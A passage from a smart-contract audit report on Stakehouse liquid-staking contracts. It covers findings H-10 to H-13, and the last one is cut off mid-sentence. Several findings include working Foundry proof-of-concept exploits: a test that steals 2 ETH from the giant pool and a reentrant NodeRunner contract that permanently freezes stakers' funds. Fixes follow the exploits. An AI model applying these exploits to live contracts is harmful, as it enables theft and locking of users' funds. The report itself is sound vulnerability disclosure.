diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.solindex 81be706..9b9c502 100644--- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {// Calculate how much ETH rewards the address is owed / dueuint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];if (due > 0) {-                claimed[_user][_token] = due;+                claimed[_user][_token] += due;totalClaimed += due;
vince0656 (Stakehouse) confirmed

[H-10]GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPoolfunction loses the addition of the idleETH which allows attackers to steal most of eth from the Giant Pool
Submitted byronnyx2017, also found byLambda
https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178
The contract GiantMevAndFeesPool override the function totalRewardsReceived:
return address(this).balance + totalClaimed - idleETH;
The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the functionSyndicateRewardsProcessor._updateAccumulatedETHPerLP
uint256 received = totalRewardsReceived();uint256 unprocessed = received - totalETHSeen;
The idleETH will be decreased in the functionbatchDepositETHForStakingfor sending eth to the staking pool. But the idleETH wont be increased in the functionbringUnusedETHBackIntoGiantPoolwhich is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, theaccumulatedETHPerLPShareis added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.
Proof of Concept
test:test/foundry/TakeFromGiantPools.t.sol
pragma solidity ^0.8.13;// SPDX-License-Identifier: MITimport "forge-std/console.sol";import {GiantPoolTests} from "./GiantPools.t.sol";import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";contract TakeFromGiantPools is GiantPoolTests {function testDWclaimRewards() public{address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);// Register BLS keyregisterSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);// Deposit ETH into giant fees and mevvm.startPrank(feesAndMevUserOne);giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);vm.stopPrank();vm.startPrank(feesAndMevUserTwo);giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);bytes[][] memory blsKeysForVaults = new bytes[][](1);blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);uint256[][] memory stakeAmountsForVaults = new uint256[][](1);stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(manager.stakingFundsVault())),getUint256ArrayFromValues(4 ether),blsKeysForVaults,stakeAmountsForVaults);vm.warp(block.timestamp+31 minutes);LPToken[] memory tokens = new LPToken[](1);tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);LPToken[][] memory allTokens = new LPToken[][](1);allTokens[0] = tokens;giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(getAddressArrayFromValues(address(manager.stakingFundsVault())),allTokens,stakeAmountsForVaults);// inject a NOOP to skip some functionsaddress[] memory stakingFundsVaults = new address[](1);bytes memory code = new bytes(1);code[0] = 0x00;vm.etch(address(0x123), code);stakingFundsVaults[0] = address(0x123);giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);vm.stopPrank();console.log("user one:", getBalance(feesAndMevUserOne));console.log("user two(attacker):", getBalance(feesAndMevUserTwo));console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));}function getBalance(address addr) internal returns (uint){// giant LP : eth at ratio of 1:1return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);}}
run test:
forge test --match-test testDWclaimRewards -vvv
test log:
Logs:user one: 4000000000000000000user two(attacker): 6000000000000000000giantFeesAndMevPool: 6000000000000000000
The attacker stole 2 eth from the pool.
Tools Used
foundry
Recommended Mitigation Steps
Add
idleETH += _amounts[i];
before burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function.
vince0656 (Stakehouse) confirmed

[H-11] Protocol insolvent - Permanent freeze of funds
Submitted by0xdeadbeef0x, also found byjoestakey
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524
Permanent freeze of funds - users who deposited ETH for staking will not be able to receive their funds, rewards or rotate to another token. The protocol becomes insolvent, it cannot pay anything to the users.Protocol’s LifecycleStatus state machine is broken
Other impacts:
Users deposit funds to an unstakable validator (node runner has already took out his funds)
Impact is also on the Giant Pools that give liquidity to the vaults.
A competitor or malicious actor can cause bad PR for the protocol by causing permanent freeze of user funds at LSD stakehouse.
Proof of Concept
There are two main bugs that cause the above impact:
Reentrancy bug inwithdrawETHForKnotfunction inLiquidStakingManager.solImproper balance check inLiquidStakingManager.solfor deposited node runner funds.
For easier reading and understanding, please follow the below full attack flow diagram when reading through the explanation.
┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐│           │               │           │            │           │              │           ││Node Runner│               │LSD Manager│            │   Vaults  │              │   Users   ││           │               │           │            │           │              │           │└─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘│                           │                        │                          ││   Register BLS Key #1     │                        │                          │├──────────────────────────►│                        │                          ││                           │                        │                          ││   Register BLS Key #1     │                        │                          │├──────────────────────────►│                        │Deposit 24 ETH to savETH  ││                           │                        │◄─────────────────────────┤│                           │                        │                          ││                           │                        │Deposit 4 ETH to mevAndFees│                           │                        │◄─────────────────────────┐│WithdrawETHForKnot BLS #1  │                        │                          │├──────────────────────────►│                        │                          ││       Send 4 ETH          │                        │                          ││◄──────────────────────────┤                        │                          ││ Reenter stake function    │                        │                          │├──────────────────────────►│Get 28 ETH from vaults  │                          ││                           ├───────────────────────►│                          ││ ┌───────────────────────┐ │     Send 28 ETH        │                          ││ │ Stake complete.       │ │◄───────────────────────┤                          ││ │status=DEPOSIT_COMPLETE│ │                        │                          ││ └───────────────────────┘ │                        │                          ││Finished WithdrawETHForKnot│                        │                          ││◄──────────────────────────┤                        │Users cannot mint derivati│es│                           │                        │◄─────────────────────────┤│    ┌──────────────────┐   │                        │Users cannot burnLPTokens ││    │BLS Key #1 banned │   │                        │◄─────────────────────────┤│    └──────────────────┘   │                        │Users cannot rotateTokens ││                           │                        │◄─────────────────────────┤│                           │                        │                          │
Let’s assume the following starting point:
Node runner registered and paid 4 ETH for BLS KEY#1Node runner registered and paid 4 ETH for BLS KEY#2savETH users collected 24 ETH ready for stakingmevAndFess users collected 4 ETH ready for staking
Reentrancy inwithdrawETHForKnot:
withdrawETHForKnotis a function used inLiquidStakingManager. It is used to refund a node runner if funds are not yet staked and BAN the BLS key.
withdrawETHForKnot:https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326
function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {....IOwnableSmartWallet(associatedSmartWallet).rawExecute(_recipient,"",4 ether);....bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;}
The associatedSmartWallet will send the node runner 4 ETH (out of 8 currently in balance).
Please note:
The Node Runner can reenter theLiquidStakingManagerwhen receiving the 4 ETHbannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;is only executed after the reentrancy
We can call any method we need with the following states:
BLS key is NOT bannedStatus isIDataStructures.LifecycleStatus.INITIALS_REGISTERED
The node runner will call thestakefunction to stake the deposited funds from the vaults and change the status toIDataStructures.LifecycleStatus.DEPOSIT_COMPLETE
stake:https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524
function stake(bytes[] calldata _blsPublicKeyOfKnots,bytes[] calldata _ciphertexts,bytes[] calldata _aesEncryptorKeys,IDataStructures.EIP712Signature[] calldata _encryptionSignatures,bytes32[] calldata _dataRoots) external {....// check if BLS public key is registered with liquid staking derivative network and not bannedrequire(isBLSPublicKeyBanned(blsPubKey) == false, "BLS public key is banned or not a part of LSD network");....require(getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,"Initials not registered");...._assertEtherIsReadyForValidatorStaking(blsPubKey);_stake(_blsPublicKeyOfKnots[i],_ciphertexts[i],_aesEncryptorKeys[i],_encryptionSignatures[i],_dataRoots[i]);....}
Thestakefunction checks
That the BLS key is not banned. In our case its not yet banned, because the banning happens after the reentrancyIDataStructures.LifecycleStatus.INITIALS_REGISTERED is the current Lifecycle status. Which it is.There is enough balance in the vaults and node runners smart wallet in_assertEtherIsReadyForValidatorStaking
_assertEtherIsReadyForValidatorStakingchecks that the node runners smart wallet has more than 4 ETH.
Because our node runner has two BLS keys registered, there is an additional 4 ETH on BLS Key #2 and the conditions will pass.
_assertEtherIsReadyForValidatorStakinghttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934
function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {address associatedSmartWallet = smartWalletOfKnot[blsPubKey];require(associatedSmartWallet.balance >= 4 ether, "Smart wallet balance must be at least 4 ether");LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");require(savETHVaultLP.totalSupply() == 24 ether, "KNOT must have 24 ETH in savETH vault");}
Since we can pass all checks._stakewill be called which withdraws all needed funds from the vault and executes a call through the smart wallet to theTransactionRouterwith 32 ETH needed for the stake. TheTransactionRouterwill process the funds and stake them. TheLifecycleStatuswill be updated toIDataStructures.LifecycleStatus.DEPOSIT_COMPLETE
_stake:https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L739
function _stake(bytes calldata _blsPublicKey,bytes calldata _cipherText,bytes calldata _aesEncryptorKey,IDataStructures.EIP712Signature calldata _encryptionSignature,bytes32 dataRoot) internal {address smartWallet = smartWalletOfKnot[_blsPublicKey];// send 24 ether from savETH vault to smart walletsavETHVault.withdrawETHForStaking(smartWallet, 24 ether);// send 4 ether from DAO staking funds vaultstakingFundsVault.withdrawETH(smartWallet, 4 ether);// interact with transaction router using smart wallet to deposit 32 ETHIOwnableSmartWallet(smartWallet).execute(address(getTransactionRouter()),abi.encodeWithSelector(ITransactionRouter.registerValidator.selector,smartWallet,_blsPublicKey,_cipherText,_aesEncryptorKey,_encryptionSignature,dataRoot),32 ether);....}
After_stakeandstakewill finish executing we will finish the Cross-Function Reentrancy.
The protocol has entered the following state for the BLS key#1:
BLS Key#1is bannedLifecycleStatus isIDataStructures.LifecycleStatus.DEPOSIT_COMPLETE
In such a state where the key is banned, no one can mint derivatives and therefor depositors cannot withdraw rewards/dETH:
mintDerivatives:https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L577
function mintDerivatives(bytes[] calldata _blsPublicKeyOfKnots,IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,IDataStructures.EIP712Signature[] calldata _reportSignatures) external {....// check if BLS public key is registered and not bannedrequire(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, "BLS public key is banned or not a part of LSD network");....
Vault LP Tokens cannot be burned for withdraws because that is not supported inDEPOSIT_COMPLETEstate:
burnLPToken:https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126
function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {...bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];IDataStructures.LifecycleStatus validatorStatus = getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot);require(validatorStatus == IDataStructures.LifecycleStatus.INITIALS_REGISTERED ||validatorStatus == IDataStructures.LifecycleStatus.TOKENS_MINTED,"Cannot burn LP tokens");....
Tokens cannot be rotated to other LP tokens because that is not supported in a DEPOSIT_COMPLETE state
rotateLPTokens
function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {...bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];...require(getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,"Lifecycle status must be one");...
Funds are stuck, they cannot be taken or used.The LifecycleStatus is also stuck, tokens cannot be minted.
Foundry POC
The POC will showcase the scenario in the diagram.
Add the following contracts toliquid-stakingfolder:https://github.com/coade-423n4/2022-11-stakehouse/tree/main/contracts/testing/liquid-staking
// SPDX-License-Identifier: MITpragma solidity 0.8.13;import { LiquidStakingManager } from "../../liquid-staking/LiquidStakingManager.sol";import { TestUtils } from "../../../test/utils/TestUtils.sol";contract NodeRunner {bytes blsPublicKey1;LiquidStakingManager manager;TestUtils testUtils;constructor(LiquidStakingManager _manager, bytes memory _blsPublicKey1, bytes memory _blsPublicKey2, address _testUtils) payable public {manager = _manager;blsPublicKey1 = _blsPublicKey1;testUtils = TestUtils(_testUtils);//register BLS Key #1manager.registerBLSPublicKeys{ value: 4 ether }(testUtils.getBytesArrayFromBytes(blsPublicKey1),testUtils.getBytesArrayFromBytes(blsPublicKey1),address(0xdeadbeef));// Register BLS Key #2manager.registerBLSPublicKeys{ value: 4 ether }(testUtils.getBytesArrayFromBytes(_blsPublicKey2),testUtils.getBytesArrayFromBytes(_blsPublicKey2),address(0xdeadbeef));}receive() external payable {testUtils.stakeSingleBlsPubKey(blsPublicKey1);}}
Add the following imports toLiquidStakingManager.t.solhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12
import { NodeRunner } from "../../contracts/testing/liquid-staking/NodeRunner.sol";import { IDataStructures } from "@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol";
Add the following test toLiquidStakingManager.t.solhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L121
function testLockStakersFunds() public {uint256 startAmount = 8 ether;// Create NodeRunner. Constructor registers two BLS Keysaddress nodeRunner = address(new NodeRunner{value: startAmount}(manager, blsPubKeyOne, blsPubKeyTwo, address(this)));// Simulate state transitions in lifecycle status to initials registered (value of 1)MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);// savETHUser, feesAndMevUser funds used to deposit into validator BLS key #1address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);// deposit savETHUser, feesAndMevUser funds for validator #1depositIntoDefaultSavETHVault(savETHUser, blsPubKeyOne, 24 ether);depositIntoDefaultStakingFundsVault(feesAndMevUser, blsPubKeyOne, 4 ether);// withdraw ETH for first BLS key and reenter// This will perform a cross-function reentracy to call stakevm.startPrank(nodeRunner);manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);// Simulate state transitions in lifecycle status to ETH deposited (value of 2)// In real deployment, when stake is called TransactionRouter.registerValidator is called to change the state to DEPOSIT_COMPLETEMockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 2);vm.stopPrank();// Validate mintDerivatives reverts because of banned public key(,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();(,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();vm.expectRevert("BLS public key is banned or not a part of LSD network");manager.mintDerivatives(getBytesArrayFromBytes(blsPubKeyOne),reports,sigs);// Validate depositor cannot burn LP tokensvm.startPrank(savETHUser);vm.expectRevert("Cannot burn LP tokens");savETHVault.burnLPTokensByBLS(getBytesArrayFromBytes(blsPubKeyOne), getUint256ArrayFromValues(24 ether));vm.stopPrank();}
To run the POC execute:yarn test -m testLockStakersFunds -v
Expected output:
Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests[PASS] testLockStakersFunds() (gas: 1731537)Test result: ok. 1 passed; 0 failed; finished in 8.21ms
To see the full trace, execute:yarn test -m testLockStakersFunds -vvvv
Tools Used
VS Code, Foundry
Recommended Mitigation Steps
Add a reentrancy guard towithdrawETHForKnotandstakeKeep proper accounting for ETH deposited by node runner for each BLS key
vince0656 (Stakehouse) confirmed

[H-12] Sender transferringGiantMevAndFeesPooltokens can afterward experience pool DOS and orphaning of future rewards
Submitted by9svR6w, also found byJTJabba,unforgiven, andaphak5010
When a user transfers away GiantMevAndFeesPool tokens, the pool’s claimed[] computed is left unchanged and still corresponds to what they had claimed with their old (higher) number of tokens. (See GiantMevAndFeesPool afterTokenTransfer() - no adjustment is made to claimed[] on the from side.) As a result, their claimed[] may be higher than the max amount they could possibly have claimed for their new (smaller) number of tokens. The erroneous claimed value can cause an integer overflow when the claimed[] value is subtracted, leading to inability for this user to access some functions of the GiantMevAndFeesPool - including such things as being able to transfer their tokens (overflow is triggered in a callback attempting to pay out their rewards). These overflows will occur in SyndicateRewardsProcessor’s _previewAccumulatedETH() and _distributeETHRewardsToUserForToken(), the latter of which is called in a number of places. When rewards are later accumulated in the pool, the user will not be able to claim certain rewards owed to them because of the incorrect (high) claimed[] value. The excess rewards will be orphaned in the pool.
Proof of Concept
This patch demonstrates both DOS and orphaned rewards due to the claimed[] error described above. Note that the patch includes a temp fix for the separate issue calculating claimed[] in _distributeETHRewardsToUserForToken() in order to demonstrate this is a separate issue.
Run test
forge test -m testTransferDOSUserOrphansFutureRewards
Patch
diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.solindex 81be706..ca44ae6 100644--- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {// Calculate how much ETH rewards the address is owed / dueuint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];if (due > 0) {-                claimed[_user][_token] = due;+                claimed[_user][_token] += due; // temp fix claimed calculationtotalClaimed += due;diff --git a/test/foundry/GiantPools.t.sol b/test/foundry/GiantPools.t.solindex 7e8bfdb..6468373 100644--- a/test/foundry/GiantPools.t.sol+++ b/test/foundry/GiantPools.t.sol@@ -5,14 +5,18 @@ pragma solidity ^0.8.13;import "forge-std/console.sol";import { TestUtils } from "../utils/TestUtils.sol";+import { MockLiquidStakingManager } from "../../contracts/testing/liquid-staking/MockLiquidStakingManager.sol";import { GiantSavETHVaultPool } from "../../contracts/liquid-staking/GiantSavETHVaultPool.sol";import { GiantMevAndFeesPool } from "../../contracts/liquid-staking/GiantMevAndFeesPool.sol";import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";+import { GiantLP } from "../../contracts/liquid-staking/GiantLP.sol";import { MockSlotRegistry } from "../../contracts/testing/stakehouse/MockSlotRegistry.sol";import { MockSavETHVault } from "../../contracts/testing/liquid-staking/MockSavETHVault.sol";import { MockGiantSavETHVaultPool } from "../../contracts/testing/liquid-staking/MockGiantSavETHVaultPool.sol";import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";+import "forge-std/console.sol";+contract GiantPoolTests is TestUtils {MockGiantSavETHVaultPool public giantSavETHPool;@@ -116,4 +120,171 @@ contract GiantPoolTests is TestUtils {assertEq(dETHToken.balanceOf(savETHUser), 24 ether);}+    function addNewLSM(address payable giantFeesAndMevPool, bytes memory blsPubKey) public returns (address payable) {+        manager = deployNewLiquidStakingNetwork(+            factory,+            admin,+            true,+            "LSDN"+        );++        savETHVault = MockSavETHVault(address(manager.savETHVault()));++        giantSavETHPool = new MockGiantSavETHVaultPool(factory, savETHVault.dETHToken());++        // Set up users and ETH+        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);+        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);++        // Register BLS key+        registerSingleBLSPubKey(nodeRunner, blsPubKey, accountFour);++        // Deposit ETH into giant savETH+        vm.prank(savETHUser);+        giantSavETHPool.depositETH{value: 24 ether}(24 ether);+        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);+        assertEq(address(giantSavETHPool).balance, 24 ether);++        // Deploy ETH from giant LP into savETH pool of LSDN instance+        bytes[][] memory blsKeysForVaults = new bytes[][](1);+        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKey);++        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);+        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);++        giantSavETHPool.batchDepositETHForStaking(+            getAddressArrayFromValues(address(manager.savETHVault())),+            getUint256ArrayFromValues(24 ether),+            blsKeysForVaults,+            stakeAmountsForVaults+        );+        assertEq(address(manager.savETHVault()).balance, 24 ether);++        assert(giantFeesAndMevPool.balance >= 4 ether);+        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);+        GiantMevAndFeesPool(giantFeesAndMevPool).batchDepositETHForStaking(+            getAddressArrayFromValues(address(manager.stakingFundsVault())),+            getUint256ArrayFromValues(4 ether),+            blsKeysForVaults,+            stakeAmountsForVaults+        );++        // Ensure we can stake and mint derivatives+        stakeAndMintDerivativesSingleKey(blsPubKey);++        return payable(manager);+    }++    function testTransferDOSUserOrphansFutureRewards() public {++        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 8 ether);+        address feesAndMevUserTwo = accountFour;++       // Deposit ETH into giant fees and mev+        vm.startPrank(feesAndMevUserOne);+        giantFeesAndMevPool.depositETH{value: 8 ether}(8 ether);+        vm.stopPrank();++        MockLiquidStakingManager manager1 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyOne));+        MockLiquidStakingManager manager2 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyTwo));++        bytes[][] memory blsPubKeyOneInput = new bytes[][](1);+        blsPubKeyOneInput[0] = getBytesArrayFromBytes(blsPubKeyOne);++        bytes[][] memory blsPubKeyTwoInput = new bytes[][](1);+        blsPubKeyTwoInput[0] = getBytesArrayFromBytes(blsPubKeyTwo);++        vm.warp(block.timestamp + 3 hours);++        // Add 2 eth rewards to manager1's staking funds vault.+        vm.deal(address(manager1.stakingFundsVault()), 2 ether);++        // Claim rewards into the giant pool and distribute them to user one.+        vm.startPrank(feesAndMevUserOne);+        giantFeesAndMevPool.claimRewards(+            feesAndMevUserOne,+            getAddressArrayFromValues(address(manager1.stakingFundsVault())),+            blsPubKeyOneInput);+        vm.stopPrank();++        // User one has received all the rewards and has no more previewed rewards.+        assertEq(feesAndMevUserOne.balance, 2 ether);+        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 2 ether);+        assertEq(+            giantFeesAndMevPool.previewAccumulatedETH(+                feesAndMevUserOne,+                new address[](0),+                new LPToken[][](0)),+                0);++        // Check the claimed[] value for user 1. It is correct.+        assertEq(+            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())),+            2 ether);++        // User one transfers half their giant tokens to user 2.+        vm.startPrank(feesAndMevUserOne);+        giantFeesAndMevPool.lpTokenETH().transfer(feesAndMevUserTwo, 4 ether);+        vm.stopPrank();++        // After the tokens have been transferred to user 2, user 1's claimed[] remains+        // unchanged - and is higher than the accumulated payout per share for user 1's+        // current number of shares.+        assertEq(+            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())),+            2 ether);++        // With this incorrect value of claimed[] causing a subtraction underflow, user one+        // cannot preview accumulated eth or perform any action that attempts to claim their+        // rewards such as transferring their tokens.+        vm.startPrank(feesAndMevUserOne);+        vm.expectRevert();+        giantFeesAndMevPool.previewAccumulatedETH(+            feesAndMevUserOne,+            new address[](0),+            new LPToken[][](0));++        console.log("the revert expected now");+        GiantLP token = giantFeesAndMevPool.lpTokenETH();+        vm.expectRevert();+        token.transfer(feesAndMevUserTwo, 1 ether);+        vm.stopPrank();++        // Add 1 eth rewards to manager2's staking funds vault.+        vm.deal(address(manager2.stakingFundsVault()), 2 ether);++        // User 2 claims rewards into the giant pool and obtains its 1/2 share.+        vm.startPrank(feesAndMevUserTwo);+        giantFeesAndMevPool.claimRewards(+            feesAndMevUserTwo,+            getAddressArrayFromValues(address(manager2.stakingFundsVault())),+            blsPubKeyTwoInput);+        vm.stopPrank();+        assertEq(feesAndMevUserTwo.balance, 1 ether);++        // At this point, user 1 ought to have accumulated 1 ether from the rewards,+        // however accumulated eth is listed as 0.+        // The reason is that when the giant pool tokens were transferred to+        // user two, the claimed[] value for user one was left unchanged.+        assertEq(+            giantFeesAndMevPool.previewAccumulatedETH(+                feesAndMevUserOne,+                new address[](0),+                new LPToken[][](0)),+                0);++        // The pool has received 4 eth rewards and paid out 3, but no users+        // are listed as having accumulated the eth. It is orphaned.+        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 4 ether);+        assertEq(giantFeesAndMevPool.totalClaimed(), 3 ether);++        assertEq(+            giantFeesAndMevPool.previewAccumulatedETH(+                feesAndMevUserTwo,+                new address[](0),+                new LPToken[][](0)),+                0);++    }+}\ No newline at end of file
Recommended Mitigation Steps
Reduceclaimed[]when necessary on the from side when GiantMevAndFeesPool tokens are transferred. Alternatively, claimed[] could be calculated on a per share basis rather than a total basis in order to simplify some of the adjustments that must be made in the code for claimed[].
vince0656 (Stakehouse) confirmed

[H-13] Possible reentrancy and fund theft inwithdrawDETH()ofGiantSavETHVaultPoolbecause there is no whitelist check for user provided Vaults and there is no reentrancy defense
Submitted byunforgiven
FunctionwithdrawDETH()inGiantSavETHVaultPoolallows a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults. This function make external calls to user provided addresses without checking those addresses and send increased dETH balance of contract during the call to user. User can provide malicious addresses to contract and then took the execution flow during the transaction and increase dETH balance of contract by other calls and make contract to transfer them to him.
Proof of Concept
This iswithdrawDETH()inGiantSavETHVaultPoolcode:
/// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults/// @param _savETHVaults List of savETH vaults being interacted with/// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH/// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETHfunction withdrawDETH(address[] calldata _savETHVaults,LPToken[][] calldata _lpTokens,uint256[][] calldata _amounts) external {uint256 numOfVaults = _savETHVaults.length;require(numOfVaults > 0, "Empty arrays");require(numOfVaults == _lpTokens.length, "Inconsistent arrays");require(numOfVaults == _amounts.length, "Inconsistent arrays");// Firstly capture current dETH balance and see how much has been deposited after the loopuint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));for (uint256 i; i < numOfVaults; ++i) {SavETHVault vault = SavETHVault(_savETHVaults[i]);// Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the userfor (uint256 j; j < _lpTokens[i].length; ++j) {LPToken token = _lpTokens[i][j];uint256 amount = _amounts[i][j];// Check the user has enough giant LP to burn and that the pool has enough savETH vault LP_assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);require(vault.isDETHReadyForWithdrawal(address(token)), "dETH is not ready for withdrawal");// Giant LP is burned 1:1 with LPs from sub-networksrequire(lpTokenETH.balanceOf(msg.sender) >= amount, "User does not own enough LP");// Burn giant LP from user before sending them dETHlpTokenETH.burn(msg.sender, amount);emit LPBurnedForDETH(address(token), msg.sender, amount);}// Askvault.burnLPTokens(_lpTokens[i], _amounts[i]);}// Calculate how much dETH has been received from burningdETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;// Send giant LP holder dETH owedgetDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);}
As you can see first contract save the dETH balance of contract by this line:uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));and then it loops through user provided vaults addresses and call those vaults to withdraw dETH and in the end it calculatesdETHReceivedFromAllSavETHVaultsand transfer those dETH to user:getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);. attacker can perform these steps:
